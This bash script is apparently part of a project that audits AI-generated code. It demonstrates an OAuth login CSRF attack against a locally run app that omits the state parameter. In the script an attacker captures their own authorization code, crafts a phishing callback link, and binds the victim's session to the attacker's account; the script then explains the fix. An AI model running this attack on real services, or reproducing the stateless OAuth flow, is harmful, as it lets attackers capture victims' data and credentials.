#!/usr/bin/env bash
# Demonstrates OAuth login CSRF (missing state parameter) in
# output/gpt-4/auth_oauth_003.py.
#
# The AI's /login route builds the auth URL with no `state`. The
# /callback route accepts whatever `code` arrives without checking
# that it was issued for a flow this user actually started.
#
# Attack:
#   1. Attacker logs in to provider as themselves.
#   2. Attacker initiates the OAuth flow against the victim app
#      and intercepts the auth code from the redirect (they
#      control the browser doing the flow, so they see it).
#   3. Attacker crafts: $VICTIM/callback?code=<attacker-code>
#   4. Victim clicks. Victim's session at the victim app gets
#      bound to the attacker's account.
#   5. Whatever the victim does in the app from then on (upload
#      photos, save credit card, link 2FA, etc.) goes into the
#      attacker's account, which the attacker logs into normally.
#
# Usage:
#   ./run-demo.sh
#
# Run from this directory.

set -euo pipefail

cd "$(dirname "$0")"

REPO_ROOT="$(cd ../.. && pwd)"
PYTHON="${PYTHON:-$REPO_ROOT/venv/bin/python}"
PIP="${PIP:-$REPO_ROOT/venv/bin/pip}"
VICTIM_PORT="${VICTIM_PORT:-5097}"
PROVIDER_PORT="${PROVIDER_PORT:-6071}"

if [ ! -x "$PYTHON" ]; then
    echo "Error: cannot find project venv python at $PYTHON" >&2
    exit 1
fi

# Install Flask if missing.
if ! "$PYTHON" -c "import flask" >/dev/null 2>&1; then
    echo "=== One-time: installing Flask + requests ==="
    "$PIP" install -q flask requests
    echo "  ok"
    echo
fi

VICTIM_BASE="http://127.0.0.1:$VICTIM_PORT"
PROVIDER_BASE="http://127.0.0.1:$PROVIDER_PORT"

echo "=== Step 0: start victim app (AI handler) + local OAuth provider ==="
VICTIM_PORT="$VICTIM_PORT" PROVIDER_PORT="$PROVIDER_PORT" \
    "$PYTHON" server.py > /tmp/oauth_state_server.log 2>&1 &
SERVER_PID=$!
trap "kill $SERVER_PID 2>/dev/null || true; rm -f /tmp/oauth_state_*.cookies" EXIT
for _ in $(seq 1 30); do
    if curl -sf "$VICTIM_BASE/" -o /dev/null && curl -sf "$PROVIDER_BASE/provider-status" -o /dev/null; then
        break
    fi
    sleep 0.2
done
echo "  victim app:        $VICTIM_BASE"
echo "  oauth provider:    $PROVIDER_BASE"
echo

ATTACKER_COOKIES=$(mktemp -t oauth-state-attacker.XXXXXX)
VICTIM_COOKIES=$(mktemp -t oauth-state-victim.XXXXXX)

echo "=== Step 1: attacker logs in to the OAuth provider as themselves ==="
echo "  curl $PROVIDER_BASE/provider-login?username=attacker"
curl -s -c "$ATTACKER_COOKIES" "$PROVIDER_BASE/provider-login?username=attacker" -L | sed 's/^/    /'
echo

echo "=== Step 2: attacker initiates the OAuth flow against the victim app ==="
echo "  curl -L $VICTIM_BASE/login   (provider auto-consents because attacker has session)"
# Run the flow with curl's redirect-following turned ON. Capture the
# final URL to see what code was issued, then DON'T let the victim
# app's /callback exchange it (we want the attacker to keep the code).
#
# Easier: hit the authorize endpoint directly with the attacker's
# cookies, capture the redirect. /login doesn't have state so this
# matches the AI's flow exactly.
ATTACKER_AUTH_URL="$PROVIDER_BASE/oauth/authorize?response_type=code&client_id=demo-client-id&redirect_uri=$VICTIM_BASE/callback"
LOC=$(curl -s -b "$ATTACKER_COOKIES" -o /dev/null -w '%{redirect_url}\n' "$ATTACKER_AUTH_URL")
ATTACKER_CODE=$(echo "$LOC" | sed -E 's/.*[?&]code=([^&]+).*/\1/')
echo "  redirect URL: $LOC"
echo "  >>> attacker captures code: $ATTACKER_CODE <<<"
echo

echo "=== Step 3: attacker crafts a phishing link to the victim app ==="
PHISHING_LINK="$VICTIM_BASE/callback?code=$ATTACKER_CODE"
echo "  Phishing link the attacker DMs to the victim:"
echo "    $PHISHING_LINK"
echo
echo "  In a real attack: the link is buried in an email saying"
echo "  'finish setting up your account' or similar. The host portion"
echo "  is the legitimate victim domain — link previews look safe."
echo

echo "=== Step 4: victim clicks the phishing link (no provider session needed for victim — the code is already issued) ==="
echo "  curl -c victim-cookies $PHISHING_LINK"
RESP=$(curl -s -c "$VICTIM_COOKIES" "$PHISHING_LINK")
echo "    victim app response:"
echo "      $RESP"
echo
echo "  victim's session cookie now binds to whatever account that code unlocked."
echo

echo "=== Step 5: prove the victim's session is logged in as the ATTACKER ==="
echo "  curl -b victim-cookies $VICTIM_BASE/whoami"
curl -s -b "$VICTIM_COOKIES" "$VICTIM_BASE/whoami" | sed 's/^/    /'
echo

cat <<EOF
=== Done ===
The victim clicked a link with the legitimate victim-app host —
\`$VICTIM_BASE/callback?code=...\` — and their browser session at
the victim app is now bound to the ATTACKER's provider identity.

From this point on, anything the victim does on the victim app
(upload a profile photo, enter a credit card, link 2FA secrets,
post a message under "their" account) lands in the attacker's
account on the provider side.

The fix is one parameter: \`state\`. The /login route generates a
random nonce, stores it in the session, includes it in the auth
URL. The /callback route checks that the returned state matches
the session's nonce. The attacker can't forge a code paired with
the victim's session-bound nonce, so the phishing link is rejected.

The AI's code includes neither the generation nor the check.
EOF
